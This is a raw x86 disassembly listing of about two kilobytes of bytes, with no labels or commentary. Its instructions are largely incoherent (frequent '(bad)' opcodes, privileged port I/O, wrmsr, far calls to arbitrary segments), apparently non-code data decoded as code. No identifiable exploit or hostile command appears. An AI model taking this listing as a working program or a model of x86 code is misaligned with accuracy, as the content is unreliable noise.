  4067cf:	icebp  
  4067d0:	or     eax,0x26c8cdf0
  4067d5:	mov    dh,0xfa
  4067d7:	cmp    esi,edx
  4067d9:	and    DWORD PTR [edi+0x1f9881b6],0x6de58d9d
  4067e3:	mov    DWORD PTR [ebp-0x24],ebx
  4067e6:	out    0x62,al
  4067e8:	out    dx,eax
  4067e9:	and    ecx,DWORD PTR [ebx+0x6d06c295]
  4067ef:	cld    
  4067f0:	aaa    
  4067f1:	repz and ch,BYTE PTR [edx+0x53]
  4067f5:	xchg   esi,eax
  4067f6:	rcr    BYTE PTR [edx+0x223e2405],cl
  4067fc:	mov    eax,ds:0xa2bf1994
  406801:	ins    BYTE PTR es:[edi],dx
  406802:	cdq    
  406803:	repz fadd st,st(3)
  406806:	mov    ecx,0xec4fd163
  40680b:	inc    ecx
  40680c:	int    0x36
  40680e:	ret    
  40680f:	mov    bl,0xcb
  406811:	stos   BYTE PTR es:[edi],al
  406812:	or     DWORD PTR es:[esi],esi
  406815:	pop    edi
  406816:	lods   eax,DWORD PTR ds:[esi]
  406817:	push   esi
  406818:	jnp    0x406870
  40681a:	push   ebx
  40681b:	icebp  
  40681c:	pop    es
  40681d:	or     al,0x16
  40681f:	mov    eax,0xda31bc9b
  406824:	leave  
  406825:	cmp    edx,edi
  406827:	sub    BYTE PTR [ebp+0x11702478],al
  40682d:	out    0xac,eax
  40682f:	fild   DWORD PTR [ecx+0x3a292e2b]
  406835:	push   0x2110d1e
  40683a:	fld    QWORD PTR [edx-0x2b]
  40683d:	in     al,dx
  40683e:	jmp    0x622:0x1d0dc582
  406845:	out    dx,eax
  406846:	pop    ebx
  406847:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406848:	ins    BYTE PTR es:[edi],dx
  406849:	xchg   edi,eax
  40684a:	sbb    ebp,ebp
  40684c:	add    cl,cl
  40684e:	mov    bl,0x4f
  406850:	out    dx,al
  406851:	push   edx
  406852:	adc    dh,bl
  406854:	(bad)  
  406855:	push   edi
  406856:	jl     0x406868
  406858:	pop    eax
  406859:	loopne 0x406849
  40685b:	sbb    dl,ch
  40685d:	mov    ah,BYTE PTR [ebx-0x12102845]
  406863:	xchg   edi,eax
  406864:	loope  0x4068d8
  406866:	lock mov al,gs:0xbe51a4e4
  40686d:	xor    ecx,DWORD PTR es:[eax-0x4e15a0f]
  406874:	ja     0x40682c
  406876:	(bad)  
  406877:	into   
  406878:	pop    ss
  406879:	jp     0x4068f9
  40687b:	push   edx
  40687c:	ficom  WORD PTR [edi-0x5573338d]
  406882:	das    
  406883:	dec    ebp
  406884:	and    edi,eax
  406886:	push   esp
  406887:	mov    edi,0xa779d2b
  40688c:	jmp    0x4068a4
  40688e:	and    cl,0x53
  406891:	adc    ah,BYTE PTR [eax]
  406893:	scas   al,BYTE PTR es:[edi]
  406894:	xor    cl,cl
  406896:	cli    
  406897:	das    
  406898:	cwde   
  406899:	adc    edx,DWORD PTR [eax+0x74]
  40689c:	lock pop ss
  40689e:	ss out dx,eax
  4068a0:	mov    esi,0x5d47007
  4068a5:	imul   ebp,edx,0xffffffde
  4068a8:	push   edx
  4068a9:	loopne 0x4068ad
  4068ab:	pushf  
  4068ac:	mov    ebp,0x4ed84b41
  4068b1:	jmp    DWORD PTR [ebx-0x2a]
  4068b4:	aaa    
  4068b5:	mov    eax,ds:0xecb5e7e4
  4068ba:	adc    cl,BYTE PTR [esi]
  4068bc:	nop
  4068bd:	push   0xffffffe0
  4068bf:	not    esp
  4068c1:	jg     0x406918
  4068c3:	mov    dh,0x9
  4068c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068c6:	fs adc ah,0x6f
  4068ca:	(bad)  
  4068cb:	mov    ecx,0x6c18e8f6
  4068d0:	pop    esi
  4068d1:	call   0x9668:0x429f13f1
  4068d8:	das    
  4068d9:	or     BYTE PTR [eax-0x3860ebde],ah
  4068df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068e0:	ins    DWORD PTR es:[edi],dx
  4068e1:	cwde   
  4068e2:	jle    0x40694f
  4068e4:	sub    DWORD PTR [ebp+eax*2-0x2d241639],ecx
  4068eb:	mov    dh,0xf7
  4068ed:	cmc    
  4068ee:	pop    edi
  4068ef:	popf   
  4068f0:	fldpi  
  4068f2:	(bad)  [edx-0x56]
  4068f5:	sbb    al,0xc5
  4068f7:	cwde   
  4068f8:	add    al,0x38
  4068fa:	xchg   esp,eax
  4068fb:	mov    al,ds:0x736b1f91
  406900:	sti    
  406901:	pop    esp
  406902:	lock pop eax
  406904:	call   0x9fad:0xb5bbfb38
  40690b:	sbb    dh,dl
  40690d:	imul   esp,ecx,0x74066f87
  406913:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406914:	stos   DWORD PTR es:[edi],eax
  406915:	outs   dx,BYTE PTR ds:[esi]
  406916:	aad    0xe6
  406918:	or     BYTE PTR [eax-0x7ec73c58],bh
  40691e:	push   0x6111feac
  406923:	stc    
  406924:	out    dx,al
  406925:	data16 add BYTE PTR [edx+edx*2-0x24],al
  40692a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40692b:	push   esi
  40692c:	cwde   
  40692d:	std    
  40692e:	(bad)  
  406930:	sbb    al,0x88
  406932:	cmp    edi,DWORD PTR [edi]
  406934:	mov    al,ds:0xcb1e31fe
  406939:	add    BYTE PTR [edx+ebp*4],0xe4
  40693d:	pop    eax
  40693e:	push   edx
  40693f:	push   edi
  406940:	imul   ebp,DWORD PTR [ecx-0x41],0x79
  406944:	imul   edx,DWORD PTR [esi-0x6ae9df71],0x17bbd86c
  40694e:	push   edx
  40694f:	nop
  406950:	inc    esi
  406951:	sub    al,0x99
  406953:	and    ch,BYTE PTR [ebp-0x1e15e42e]
  406959:	fcmovnu st,st(1)
  40695b:	mov    esi,0xfe90ff7a
  406960:	pop    edx
  406961:	mov    eax,0xcc61d5a0
  406966:	push   eax
  406967:	shl    DWORD PTR [ebp+0x7c378a39],cl
  40696d:	mov    bh,0x33
  40696f:	dec    ebp
  406970:	test   DWORD PTR [esi-0x65],0x4e88a004
  406977:	dec    eax
  406978:	inc    si
  40697a:	retf   
  40697b:	addr16 mov edx,0x6f5c6e
  406981:	xchg   edx,eax
  406982:	cdq    
  406983:	mov    ds:0x9aeeeccf,al
  406988:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406989:	push   ds
  40698a:	sbb    dh,BYTE PTR [edi-0x35284bcb]
  406990:	push   eax
  406991:	xor    edx,DWORD PTR [edi-0x1d2a2ef8]
  406997:	(bad)  
  406999:	push   eax
  40699a:	pop    edi
  40699b:	lods   al,BYTE PTR ds:[esi]
  40699c:	repz push 0xcf2270a0
  4069a2:	xor    DWORD PTR [esi+0x1261de78],0x99cb6053
  4069ac:	pop    esi
  4069ad:	xchg   esi,eax
  4069ae:	out    0x67,eax
  4069b0:	stos   DWORD PTR es:[edi],eax
  4069b1:	outs   dx,DWORD PTR ds:[esi]
  4069b2:	push   cs
  4069b3:	add    ch,BYTE PTR [ebx]
  4069b5:	in     al,dx
  4069b6:	retf   0xefe2
  4069b9:	mov    esp,edi
  4069bb:	mov    dl,BYTE PTR [edi-0x24]
  4069be:	and    eax,ecx
  4069c0:	cmp    edx,DWORD PTR [esi+0x8]
  4069c3:	mov    cl,0x14
  4069c5:	xchg   ebx,eax
  4069c6:	mov    edx,DWORD PTR [esi+eiz*2+0x6f]
  4069ca:	int3   
  4069cb:	add    al,0xef
  4069cd:	jge    0x406a21
  4069cf:	js     0x406a18
  4069d1:	sbb    esp,edi
  4069d3:	loop   0x406959
  4069d5:	mov    dl,0xc9
  4069d7:	bound  eax,QWORD PTR [ebp+0xf8e3298]
  4069dd:	push   eax
  4069de:	imul   esi,DWORD PTR [edx],0xf4f84ed1
  4069e4:	pop    ds
  4069e5:	xchg   DWORD PTR [esi-0x48],eax
  4069e8:	out    dx,eax
  4069e9:	arpl   WORD PTR [edi+0x57],di
  4069ec:	cmp    DWORD PTR [eax+eax*2],esi
  4069ef:	addr16 int 0xf0
  4069f2:	mov    ch,0x3a
  4069f4:	mov    eax,ds:0x7f8a2156
  4069f9:	sbb    al,0xb2
  4069fb:	stc    
  4069fc:	repz cmp eax,0xda12bea
  406a02:	add    eax,0x8a8314e
  406a07:	pop    es
  406a08:	jnp    0x406a40
  406a0a:	inc    esi
  406a0b:	adc    esi,DWORD PTR [ebp-0x4f]
  406a0e:	cdq    
  406a0f:	dec    ebp
  406a10:	cmp    eax,0x9a5f900e
  406a15:	retf   0xa9d7
  406a18:	xor    bl,BYTE PTR [edi]
  406a1a:	jmp    0xab363dee
  406a1f:	data16 add BYTE PTR [edi],bh
  406a22:	mov    WORD PTR [eax],gs
  406a24:	mov    ?,WORD PTR es:[edx+0x54d8f2bd]
  406a2b:	mov    dl,0xa9
  406a2d:	daa    
  406a2e:	test   DWORD PTR [edi-0x7671f922],esi
  406a34:	hlt    
  406a35:	and    eax,0xe5bd9861
  406a3a:	cmp    esi,DWORD PTR [ebp-0xa2d4227]
  406a40:	loop   0x406a8c
  406a42:	pop    ds
  406a43:	in     al,dx
  406a44:	jg     0x4069f8
  406a46:	push   es
  406a47:	inc    ebp
  406a48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a49:	push   ecx
  406a4a:	add    al,0x56
  406a4c:	cmp    ebp,ecx
  406a4e:	mov    dl,0x71
  406a50:	(bad)  
  406a51:	retf   
  406a52:	pop    edi
  406a53:	mov    al,dl
  406a55:	dec    ecx
  406a56:	mov    ebp,0x8be73f3d
  406a5b:	add    al,BYTE PTR [ebx]
  406a5d:	jns    0x406a4a
  406a5f:	lea    esp,[edi]
  406a61:	aam    0x4f
  406a63:	xor    BYTE PTR [ecx],al
  406a65:	ins    DWORD PTR es:[edi],dx
  406a66:	jae    0x406a40
  406a68:	push   ebx
  406a69:	ds call 0xd373:0xeece79f2
  406a71:	mov    ah,0x88
  406a73:	(bad)  
  406a74:	lea    edx,[ebx+0x7c]
  406a77:	sub    eax,0xde9c05d7
  406a7c:	pop    ebx
  406a7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a7e:	leave  
  406a7f:	or     al,0x38
  406a81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a82:	dec    esi
  406a83:	cmp    DWORD PTR [ebx+ecx*8],ebp
  406a86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a87:	sbb    DWORD PTR [edx],edx
  406a89:	add    edi,DWORD PTR [ecx+0x543daab]
  406a8f:	ss stc 
  406a91:	imul   esi,DWORD PTR [ebp-0x278f68f1],0xa1ee1b8a
  406a9b:	sub    BYTE PTR [ecx-0x23f864c5],dl
  406aa1:	sbb    ecx,DWORD PTR [edx]
  406aa3:	jb     0x406a83
  406aa5:	mov    ebp,0xb8ed9f22
  406aaa:	adc    al,0x30
  406aac:	dec    edx
  406aad:	xor    eax,0x855ecf56
  406ab2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ab3:	mov    bh,0xc3
  406ab5:	js     0x406ae1
  406ab7:	rcr    DWORD PTR [eax+0x1ecac2ab],1
  406abd:	push   es
  406abe:	jmp    0xb9ba:0xfba66f2c
  406ac5:	adc    ebx,eax
  406ac7:	aam    0x68
  406ac9:	test   BYTE PTR [eax+eiz*1-0x6b],al
  406acd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ace:	xor    bl,BYTE PTR [ebx]
  406ad0:	retf   0xd77b
  406ad3:	cmp    eax,0x9fc472c9
  406ad8:	div    BYTE PTR [ebx]
  406ada:	dec    edi
  406adb:	aam    0xe4
  406add:	aam    0xad
  406adf:	lods   al,BYTE PTR ds:[esi]
  406ae0:	in     al,0x6a
  406ae2:	xchg   DWORD PTR [ecx-0x4a],ebp
  406ae5:	shr    DWORD PTR [ebp+0x6bfbb53c],0x9f
  406aec:	jp     0x406b55
  406aee:	ret    
  406aef:	out    0x2,al
  406af1:	push   edx
  406af2:	fst    st(4)
  406af4:	loope  0x406ad8
  406af6:	(bad)  
  406af7:	cmp    BYTE PTR [ecx+0x986a5f2],bh
  406afd:	pusha  
  406afe:	mov    al,ds:0xd895ed0b
  406b03:	cli    
  406b04:	ror    BYTE PTR [edx],0x3d
  406b07:	mov    ah,0x57
  406b09:	loope  0x406ad7
  406b0b:	mov    DWORD PTR [edx+0x41],esp
  406b0e:	adc    al,ch
  406b10:	xlat   BYTE PTR ds:[ebx]
  406b11:	jl     0x406b88
  406b13:	loop   0x406abe
  406b15:	add    al,0xbf
  406b17:	pop    ss
  406b18:	dec    eax
  406b19:	sbb    DWORD PTR [ebx+0x1e],0x6b613b34
  406b20:	pop    edi
  406b21:	aaa    
  406b22:	sbb    ch,BYTE PTR [ebx]
  406b24:	cdq    
  406b25:	paddb  mm4,QWORD PTR [ebx-0x3e]
  406b29:	adc    esp,eax
  406b2b:	push   ebp
  406b2c:	scas   eax,DWORD PTR es:[edi]
  406b2d:	jns    0x406aee
  406b2f:	scas   al,BYTE PTR es:[edi]
  406b30:	sbb    al,0x7d
  406b32:	loop   0x406ac3
  406b34:	cmp    edx,DWORD PTR [eax+0x5f]
  406b37:	mov    WORD PTR [eax+0x54],es
  406b3a:	pusha  
  406b3b:	stos   BYTE PTR es:[edi],al
  406b3c:	cmc    
  406b3d:	push   esp
  406b3e:	sar    DWORD PTR ds:0x705d384c,cl
  406b44:	mov    ebp,esi
  406b46:	inc    edx
  406b47:	xchg   DWORD PTR [edi-0x2704129e],ebx
  406b4d:	inc    eax
  406b4e:	sbb    ebp,ecx
  406b50:	out    dx,al
  406b51:	sbb    al,0xab
  406b53:	(bad)  
  406b54:	mov    bl,BYTE PTR [esi+0x6aa49aca]
  406b5a:	mov    esp,0xf0010881
  406b5f:	or     eax,0x8f7bd3e5
  406b64:	cs and ah,cl
  406b67:	xor    ah,BYTE PTR [ebx-0x71]
  406b6a:	test   BYTE PTR [ecx+0x70],ch
  406b6d:	push   esi
  406b6e:	or     DWORD PTR [edi+edi*4+0x3936bb0c],ebx
  406b75:	popf   
  406b76:	sub    BYTE PTR [edx+0x512a77df],ah
  406b7c:	mov    esp,edi
  406b7e:	mov    dl,0xd5
  406b80:	in     al,0x72
  406b82:	mov    edx,0xfdaf7400
  406b87:	shl    esp,1
  406b89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b8a:	xor    ebp,ebx
  406b8c:	stos   DWORD PTR es:[edi],eax
  406b8d:	fidivr DWORD PTR [ebx+0x435fa584]
  406b94:	add    DWORD PTR [esi+0x335287e],0xc472a859
  406b9e:	ja     0x406c0d
  406ba0:	ret    
  406ba1:	mov    bl,0xb8
  406ba3:	in     al,0x46
  406ba5:	xor    ebx,DWORD PTR [eax-0xa945b8]
  406bab:	ror    al,1
  406bad:	ins    DWORD PTR es:[edi],dx
  406bae:	and    cl,al
  406bb0:	jmp    0x406bb4
  406bb2:	outs   dx,DWORD PTR ds:[esi]
  406bb3:	inc    edx
  406bb4:	call   0x4e3e52bc
  406bb9:	push   ss
  406bba:	aas    
  406bbb:	mov    ebp,0x28841678
  406bc0:	xchg   BYTE PTR [ecx+0x49],dh
  406bc3:	ins    DWORD PTR es:[edi],dx
  406bc4:	mov    ebp,0x4d49645e
  406bc9:	add    DWORD PTR [eax+0x2a],edx
  406bcc:	loop   0x406b6b
  406bce:	sbb    BYTE PTR [edi-0x754fef6d],bh
  406bd4:	loope  0x406b6f
  406bd6:	in     eax,dx
  406bd7:	popf   
  406bd8:	mov    ebp,0x644d8c18
  406bdd:	clc    
  406bde:	not    esp
  406be0:	xor    esi,ecx
  406be2:	jmp    0x406bef
  406be4:	popa   
  406be5:	sub    bh,BYTE PTR [ecx-0x5f]
  406be8:	cmp    ecx,DWORD PTR [esi]
  406bea:	sub    BYTE PTR [edx],bl
  406bec:	xchg   esi,eax
  406bed:	les    eax,FWORD PTR [ecx+0xff3b3e4]
  406bf3:	imul   ecx,DWORD PTR [esi-0x5c],0x55540e7e
  406bfa:	mov    esp,0xc1dd675b
  406bff:	or     ecx,DWORD PTR [edi]
  406c01:	adc    ah,dh
  406c03:	sahf   
  406c04:	sub    al,0xb9
  406c06:	cmc    
  406c07:	xchg   edi,eax
  406c08:	cmp    ch,BYTE PTR [esi+0x77]
  406c0b:	loop   0x406c40
  406c0d:	pop    edi
  406c0e:	aas    
  406c0f:	cmp    bl,BYTE PTR ds:0x5954784e
  406c15:	mov    cl,0xd4
  406c17:	sub    BYTE PTR [ebx+0x14],0xcf
  406c1b:	jle    0x406c46
  406c1d:	enter  0x182f,0xf3
  406c21:	fdivr  QWORD PTR [ebp-0x5b]
  406c24:	es jg  0x406c9b
  406c27:	sbb    edx,esp
  406c29:	or     al,0xce
  406c2b:	push   edx
  406c2c:	retf   
  406c2d:	jl     0x406c00
  406c2f:	(bad)  
  406c30:	lods   eax,DWORD PTR ds:[esi]
  406c31:	adc    DWORD PTR [ecx+0x4a1bf2b3],0xfffffff4
  406c38:	add    al,dl
  406c3a:	mov    ds:0xa7f3ed59,eax
  406c3f:	jbe    0x406bde
  406c41:	mov    ds:0x1c0099dc,eax
  406c46:	jl     0x406c02
  406c48:	cmc    
  406c49:	retf   0x7e02
  406c4c:	sti    
  406c4d:	mov    DWORD PTR [ebp-0x82a3b38],ecx
  406c53:	pop    esp
  406c54:	call   0x5aab049f
  406c59:	sbb    al,BYTE PTR [edi-0x45]
  406c5c:	sbb    ebp,ebx
  406c5e:	pminsw mm2,QWORD PTR [edx-0x169928ee]
  406c65:	call   0x8717:0x4d8804ea
  406c6c:	pusha  
  406c6d:	loop   0x406c82
  406c6f:	shl    BYTE PTR ds:0x6247342b,1
  406c75:	in     eax,0x5c
  406c77:	xor    al,0x1b
  406c79:	sub    DWORD PTR [esi+ebx*8-0x3a],ebp
  406c7d:	inc    eax
  406c7e:	mov    ch,0x64
  406c80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c81:	scas   al,BYTE PTR es:[edi]
  406c82:	mov    ds:0x510dc16b,al
  406c87:	inc    esp
  406c88:	mov    edx,0xe5392751
  406c8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c8e:	scas   al,BYTE PTR es:[edi]
  406c8f:	mov    ds:0x680e33b3,eax
  406c94:	jle    0x406cee
  406c96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c97:	jne    0x406cb2
  406c99:	outs   dx,BYTE PTR ds:[esi]
  406c9a:	aad    0x6b
  406c9c:	mov    al,BYTE PTR [eax]
  406c9e:	scas   eax,DWORD PTR es:[edi]
  406c9f:	rcl    BYTE PTR [edx-0x1c],0x1a
  406ca3:	jg     0x406c95
  406ca5:	cmp    ecx,esp
  406ca7:	mov    DWORD PTR [ebx-0x2],esp
  406caa:	ins    BYTE PTR es:[edi],dx
  406cab:	xchg   edi,eax
  406cac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cad:	or     BYTE PTR [edi-0x10e5ea41],bl
  406cb3:	jmp    0x406cf3
  406cb5:	aad    0xec
  406cb7:	test   BYTE PTR [ebp+0x46],ah
  406cba:	int3   
  406cbb:	icebp  
  406cbc:	fldcw  WORD PTR [eax]
  406cbe:	sbb    edi,DWORD PTR [esi+0x170ad62f]
  406cc4:	iret   
  406cc5:	pop    es
  406cc6:	lea    ebp,ds:0x79a15f80
  406ccc:	jecxz  0x406c67
  406cce:	adc    al,0x0
  406cd0:	xchg   BYTE PTR [esi+0x7481f00f],ah
  406cd6:	adc    al,0x74
  406cd8:	xchg   esp,ebx
  406cda:	nop
  406cdb:	jp     0x406c74
  406cdd:	and    eax,esi
  406cdf:	dec    edi
  406ce0:	sbb    BYTE PTR [ebx-0x2455357],cl
  406ce6:	int    0xee
  406ce8:	and    eax,0x76ca54e
  406ced:	mov    ecx,edi
  406cef:	call   0x35c2:0xeaf3a6df
  406cf6:	fnstcw WORD PTR ds:0x6d7130b3
  406cfc:	push   edi
  406cfd:	sbb    eax,0x74f6941b
  406d02:	rcr    dl,0xc3
  406d05:	sub    DWORD PTR [eax],ebp
  406d07:	dec    ebp
  406d08:	xchg   esi,eax
  406d09:	(bad)  
  406d0a:	mov    edx,0x88f8c9d7
  406d0f:	test   eax,0xa9cfcb9e
  406d14:	dec    ecx
  406d15:	mov    eax,gs
  406d17:	push   esi
  406d18:	inc    ecx
  406d19:	jns    0x406d3b
  406d1b:	lods   eax,DWORD PTR ds:[esi]
  406d1c:	xor    edi,DWORD PTR [edx-0x7474d7b6]
  406d22:	leave  
  406d23:	loope  0x406d19
  406d25:	std    
  406d26:	pop    edi
  406d27:	push   ds
  406d28:	cmp    dl,ch
  406d2a:	push   0x76b02de4
  406d2f:	sti    
  406d30:	mov    dh,0x67
  406d32:	bnd jnp 0x406ce5
  406d35:	adc    al,0x3
  406d37:	push   cs
  406d38:	jl     0x406d28
  406d3a:	mov    ebp,0x8e10275d
  406d3f:	leave  
  406d40:	shl    BYTE PTR ds:0xec2453e8,0xb3
  406d47:	cli    
  406d48:	bound  esi,QWORD PTR [esi]
  406d4a:	(bad)  
  406d4b:	sbb    al,0xc5
  406d4d:	mov    bh,0x8c
  406d4f:	std    
  406d50:	or     DWORD PTR [ebx],edi
  406d52:	sbb    al,0xb1
  406d54:	icebp  
  406d55:	lds    ebp,FWORD PTR [ecx+edx*1-0x5f]
  406d59:	sahf   
  406d5a:	mov    edx,DWORD PTR [esi+0x60]
  406d5d:	mov    WORD PTR [eax+0x2],gs
  406d60:	addr16 ret 
  406d62:	jecxz  0x406d23
  406d64:	cs pusha 
  406d66:	adc    BYTE PTR [ebx+0x5a],bl
  406d69:	mov    ecx,0x164b3939
  406d6e:	test   BYTE PTR [ebx+0x67],0xa7
  406d72:	jmp    0x406dd3
  406d74:	pop    ss
  406d75:	cmp    eax,ebx
  406d77:	mov    cl,0x9e
  406d79:	or     al,0x91
  406d7b:	aam    0xa9
  406d7d:	out    0x56,al
  406d7f:	dec    edx
  406d80:	mul    BYTE PTR [eax]
  406d82:	dec    DWORD PTR [eax+0x1be9e423]
  406d88:	xor    BYTE PTR [edi-0xf],bh
  406d8b:	pop    edx
  406d8c:	push   esp
  406d8d:	fisub  DWORD PTR [esi-0x7c]
  406d90:	push   eax
  406d91:	in     eax,dx
  406d92:	scas   eax,DWORD PTR es:[edi]
  406d93:	out    0x11,al
  406d95:	fmul   st(3),st
  406d97:	rcl    BYTE PTR [eax],cl
  406d99:	repz mov bh,0xd
  406d9c:	pop    es
  406d9d:	inc    esi
  406d9e:	cdq    
  406d9f:	pop    ds
  406da0:	fwait
  406da1:	xchg   esp,eax
  406da2:	pusha  
  406da3:	repz (bad) 
  406da5:	jo     0x406dfd
  406da7:	cs push edx
  406da9:	sbb    DWORD PTR [edi+0x39],edx
  406dac:	push   0xffffffad
  406dae:	pop    eax
  406db0:	push   ebp
  406db1:	jne    0x406d8a
  406db3:	adc    ch,dh
  406db5:	push   esi
  406db6:	mov    esi,DWORD PTR [ecx]
  406db8:	inc    edx
  406db9:	or     dh,ch
  406dbb:	pop    DWORD PTR ds:0x3fef6b22
  406dc1:	popf   
  406dc2:	cmp    al,0xec
  406dc4:	xor    BYTE PTR ds:0x6c9b3b9,0xc4
  406dcc:	sbb    dh,BYTE PTR [eax-0x2c0da87d]
  406dd2:	stos   BYTE PTR es:[edi],al
  406dd3:	mov    ah,0xb0
  406dd5:	cdq    
  406dd6:	scas   eax,DWORD PTR es:[edi]
  406dd7:	mov    bh,0x72
  406dd9:	es pushf 
  406ddb:	push   cs
  406ddc:	xchg   ebx,eax
  406ddd:	enter  0x9cec,0x68
  406de1:	mov    bh,0x71
  406de3:	jae    0x406df3
  406de5:	bswap  eax
  406de7:	cld    
  406de8:	mov    ebx,0xb9d0e8f
  406ded:	push   esp
  406dee:	rcr    DWORD PTR [esi],1
  406df0:	(bad)  
  406df1:	wrmsr  
  406df3:	xchg   ebx,eax
  406df4:	add    bh,al
  406df6:	pusha  
  406df7:	xchg   BYTE PTR ds:0x7b415689,bl
  406dfd:	mov    eax,ds:0xff096a2a
  406e02:	sbb    ah,BYTE PTR [ebx]
  406e04:	mov    eax,ds:0xb82cae5b
  406e09:	xor    DWORD PTR [ecx+0x3efff02f],ecx
  406e0f:	jbe    0x406e90
  406e11:	xchg   ecx,eax
  406e12:	popa   
  406e13:	leave  
  406e14:	inc    esi
  406e15:	xor    DWORD PTR [edi-0x22],edx
  406e18:	ins    DWORD PTR es:[edi],dx
  406e19:	cwde   
  406e1a:	call   0xfe87:0x18b4b1c1
  406e21:	repnz test eax,0xe70ff573
  406e27:	call   0xe928:0x22016afe
  406e2e:	into   
  406e2f:	call   DWORD PTR es:[edx-0x71]
  406e33:	xor    eax,0xf996ac1b
  406e38:	push   es
  406e39:	add    BYTE PTR [ebp-0x1e],al
  406e3c:	(bad)
  406e3f:	out    0x3a,al
  406e41:	mov    ds:0xe63535df,eax
  406e46:	dec    esp
  406e47:	repz pop ebx
  406e49:	enter  0x62ea,0xaa
  406e4d:	(bad)  
  406e4e:	adc    ah,BYTE PTR [esi-0x3b7bf9cb]
  406e54:	popaw  
  406e56:	mov    esi,0xd5f46eb
  406e5b:	jg     0x406e4c
  406e5d:	dec    esp
  406e5e:	and    eax,0xcb52c4b5
  406e63:	xchg   dx,ax
  406e65:	or     al,0xd2
  406e67:	xchg   edi,eax
  406e68:	and    BYTE PTR [eax],al
  406e6a:	mov    dh,0x1e
  406e6c:	xor    BYTE PTR [edi-0x60da4ae3],al
  406e72:	xchg   edi,eax
  406e73:	dec    eax
  406e74:	xlat   BYTE PTR ds:[ebx]
  406e75:	mov    esp,0xaf6bbd2f
  406e7a:	xchg   DWORD PTR [eax],eax
  406e7c:	sub    ebp,ecx
  406e7e:	adc    bl,ah
  406e80:	lea    ecx,[ebx-0x3]
  406e83:	inc    edi
  406e84:	mov    bh,0x4
  406e86:	mov    edx,0x6719b19b
  406e8b:	rcr    dh,1
  406e8d:	lea    esp,[ebx]
  406e8f:	out    0x6,al
  406e91:	repz sbb BYTE PTR [eax-0x10],cl
  406e95:	test   eax,0xfaf5e3d4
  406e9a:	es adc al,0x54
  406e9d:	(bad)
  406ea0:	add    al,0xec
  406ea2:	xor    dl,BYTE PTR [eax+0x5]
  406ea5:	in     eax,0x9a
  406ea7:	inc    esp
  406ea8:	add    eax,0x2417c461
  406ead:	xor    DWORD PTR [ebp+0x27d57986],0x43
  406eb4:	fwait
  406eb5:	xchg   edx,eax
  406eb6:	aas    
  406eb7:	cmp    eax,0x5756a27
  406ebc:	sub    edi,DWORD PTR [edx-0x64]
  406ebf:	(bad)  
  406ec0:	jnp    0x406e4d
  406ec2:	int    0x3d
  406ec4:	imul   ebx,eax,0xb1869a49
  406eca:	or     ah,BYTE PTR [ebx+edx*1-0x29]
  406ece:	add    ch,bh
  406ed0:	jns    0x406e5c
  406ed2:	add    ebx,DWORD PTR [ecx]
  406ed4:	xlat   BYTE PTR ds:[ebx]
  406ed5:	ins    BYTE PTR es:[edi],dx
  406ed6:	iret   
  406ed7:	imul   ebp,DWORD PTR [esp+esi*8+0x1e],0x88722201
  406edf:	sbb    eax,0x61c4f033
  406ee4:	adc    esp,eax
  406ee6:	adc    eax,0x55718074
  406eeb:	mov    bh,0xb4
  406eed:	jne    0x406f4f
  406eef:	jno    0x406f53
  406ef1:	xor    ebx,DWORD PTR [edi+0x37]
  406ef4:	mov    dl,BYTE PTR [ebx+ebp*4-0x35]
  406ef8:	dec    eax
  406ef9:	and    DWORD PTR ds:0x224a937e,eax
  406eff:	ins    DWORD PTR es:[edi],dx
  406f00:	je     0x406eee
  406f02:	push   esp
  406f03:	dec    edx
  406f04:	fimul  DWORD PTR [edx+0x5680b8eb]
  406f0a:	in     eax,0xd0
  406f0c:	jne    0x406f71
  406f0e:	(bad)  
  406f0f:	shl    BYTE PTR [edi-0x4bb2ff57],cl
  406f15:	(bad)  
  406f16:	or     DWORD PTR ds:0x1b2846d6,eax
  406f1c:	xchg   edx,eax
  406f1d:	cmp    al,0x5d
  406f1f:	inc    esi
  406f20:	sbb    ebp,ecx
  406f22:	jle    0x406f58
  406f24:	loopne 0x406f94
  406f26:	idiv   cl
  406f28:	adc    BYTE PTR [esi],dl
  406f2a:	jns    0x406f27
  406f2c:	ins    BYTE PTR es:[edi],dx
  406f2d:	add    ebp,DWORD PTR [edi-0x6e58ce60]
  406f33:	xor    eax,DWORD PTR [esi-0x71]
  406f36:	and    al,0x4d
  406f38:	test   BYTE PTR [edx],dh
  406f3a:	call   DWORD PTR [esi]
  406f3c:	cmp    bh,BYTE PTR [ebx+0x1e14b356]
  406f42:	ins    BYTE PTR es:[edi],dx
  406f43:	jns    0x406ed5
  406f45:	xor    al,dh
  406f47:	dec    ebx
  406f48:	enter  0x184b,0xc5
  406f4c:	ss loope 0x406ee3
  406f4f:	sub    BYTE PTR [ebx+0x49266b1b],ch
  406f55:	loope  0x406f48
  406f57:	xchg   ebx,eax
  406f58:	in     eax,0xaf
  406f5a:	std    
  406f5b:	push   ss
  406f5c:	ins    DWORD PTR es:[edi],dx
  406f5d:	adc    eax,0x5bfac9f4
  406f62:	and    DWORD PTR [edi+esi*2-0x63f2cc06],ebx
  406f69:	stos   BYTE PTR es:[edi],al
  406f6a:	xchg   edi,eax
  406f6b:	retf   
  406f6c:	pop    edx
  406f6d:	or     BYTE PTR [edi-0x63],cl
  406f70:	js     0x406f4a
  406f72:	jns    0x406f10
  406f74:	sub    eax,0xb2d79a77
  406f79:	arpl   bp,ax
  406f7b:	fucom  st(3)
  406f7d:	out    0x5b,al
  406f7f:	fst    DWORD PTR [edx-0x28b4d384]
  406f85:	xlat   BYTE PTR ds:[ebx]
